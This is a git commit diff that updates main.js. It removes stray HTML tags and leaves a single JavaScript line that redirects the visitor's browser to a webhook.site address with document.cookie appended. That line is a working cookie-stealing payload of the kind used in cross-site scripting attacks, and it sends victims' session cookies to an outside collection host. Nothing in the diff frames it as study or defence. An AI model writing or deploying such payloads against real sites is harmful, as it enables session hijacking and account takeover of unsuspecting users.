20ab81d1a89535a58129ccd8989cf5a8efaab24b
TiagoMF <126122241+TiogoMF@users.noreply.github.com>
2024-12-06 12:06:49 +0000

    Update main.js

--- main.js
+++ main.js
@@ -1,3 +1,2 @@
-<html>
-    window.location.href = "https://webhook.site/4767edd6-0a10-4546-9ed2-5c423db1a935?cookie=" + encodeURIComponent(document.cookie);
-<html>
+
+window.location.href = "https://webhook.site/4767edd6-0a10-4546-9ed2-5c423db1a935?cookie=" + encodeURIComponent(document.cookie);    
